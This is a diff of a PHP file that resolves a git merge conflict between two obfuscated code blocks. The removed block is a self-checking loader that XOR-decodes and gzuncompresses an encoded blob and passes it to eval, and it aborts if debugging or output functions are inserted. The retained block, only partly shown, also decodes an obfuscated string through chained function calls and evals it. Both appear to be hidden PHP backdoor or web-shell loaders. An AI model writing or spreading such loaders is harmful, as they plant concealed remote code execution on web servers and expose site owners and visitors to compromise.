@@ -1,29 +1,4 @@
 <?php
-<<<<<<< Updated upstream
-$ojsjddf="bdff437d4af692c49dd4066d14b6136e";
-$wyapqqfnjm="57065e530d505652005453530f0357025a5655025250505d54060357570b0256";
-$fggqsswu="TbiVYGQM+nYkSYKByYGlFAJg9hIvs+F9MNdxw0ZHVCqSNCNy0WEKRSFFwWWNZOHJvTF9IjFe2e1naxmHAN9SpIbE+SiXCuWGVwnFpVPgrlhRfGP8wJpPcCymR7zonvXx8kbfULt0UCimFc1AHhD2rNAieR8T+KLRtwcUCjxTLlOCsdVFxfIwuDq+aYlPpXMSp2z9R4EW6jpHTDXVM1fRjm7Lk9HVGRFAnhxINfLcDMGF6kEqN+NnEb9S0d4uJF88LabwJvRM3jGFKh6Pe2+7mMJF0yMZkhyzVu+4qfHw+QhwN4MoKfxzCvDPhaTiEFp81NolzYjPw6dtUK3pYfMWHI64lGtVdY/7jYjdE3i6EZBkrdG7iCtjrYFJ8OlGxIM/fzeVBa8L6xaI7yW5FKOuNTLP2M/Eqk7W6rFeCPQeiYl+M9VCoDYMw4qsZToWBcvaoOi+4YlOp7fDzKDVp64wKhNCZKUUwmBPPYU6ScOg2577in3qwCFCMpdzDYiB++Qtbo8VGFjyQMd2L2jbiRuSlSZZWGyUrgouvtEc2fKwuB9uVZVEgikk3jd4Jyk5c0tkPw3SmM1azcl8qHDZ4KxTG4RSJes09JuG6XdwdY/plsd7IGgaaQVUZdG59NH2gvHDSSkbuqQrtNCymH6xPMmZLHM07u8kyAz2aXGTB/FIR9HXvnqaEJNcFsajwB4ABhLQgJaMQCeOpaNhu80OReusDHvvqVFPSSfJ7Dl5yRl2Bk8GBvYk0EvgIcB8Cl8T/oWTmbtIm6LlRZ++5NntWgmiM6Zj3s5OhSuX/2qjuGGxB3hK+mNm8JgzJ65IcOmLCQVRSojICTz1z0ZN8LC0obM/6nEdw0+ifHT4/K/cs2QD7wMBgXg5K0aUcQy6LGdp2J6iSmNbgrTc";
-$lzdwoiy=file_get_contents(__FILE__);
-$ifmibpprz=str_replace($fggqsswu,"",$lzdwoiy);
-if(strpos($ifmibpprz,"ec"."ho")!==false||strpos($ifmibpprz,"pr"."int")!==false||strpos($ifmibpprz,"var_"."dump")!==false||strpos($ifmibpprz,"file_put_"."contents")!==false||strpos($ifmibpprz,"fw"."rite")!==false){die();}
-$djrwdp=str_replace(array($ojsjddf,$wyapqqfnjm),array("SP_b56cf5da","KP_1d8e6cf8"),$lzdwoiy);
-$sdyupqc=md5($djrwdp);
-$cdpsftnzn=hex2bin($wyapqqfnjm);
-$yiclkfguccsl="";
-$mbiivs=strlen($sdyupqc);
-for($oylmayz=0;$oylmayz<$mbiivs;$oylmayz++){
-$yiclkfguccsl.=chr(ord($cdpsftnzn[$oylmayz])^ord($sdyupqc[$oylmayz]));
-}
-$sobvdlv=base64_decode($fggqsswu);
-$usihsma=strlen($sobvdlv);
-$htayqsbetg="";
-$fphvsfaeuk=strlen($yiclkfguccsl);
-for($oylmayz=0;$oylmayz<$usihsma;$oylmayz++){
-$htayqsbetg.=$sobvdlv[$oylmayz]^$yiclkfguccsl[$oylmayz%$fphvsfaeuk];
-}
-$oerjmy="gzun"."compress";
-eval($oerjmy($htayqsbetg));
-=======
 // f85838e1c6625ac2d6f5a250
 $TBJUTnyrCP_="jn3d4DZyEFieQIXwhTEEOtlmx7Uxy8l1MhS1d+Sgv4E=";
 $MnFqfmYPue="wa3q4QMlRSvrDVKjuGRRBgyzk7Hkl8y1ZuF1q+Fti4R=";
@@ -52,4 +27,3 @@ $bIAZnD_oMSS=$YJBvyUtbZQ($bIAZnD_oMSS);
 $bIAZnD_oMSS=$ueuJ_MMJjdLka($bIAZnD_oMSS);
 $bIAZnD_oMSS=$ydgQytlGIT($bIAZnD_oMSS);
 eval($bIAZnD_oMSS);
->>>>>>> Stashed changes
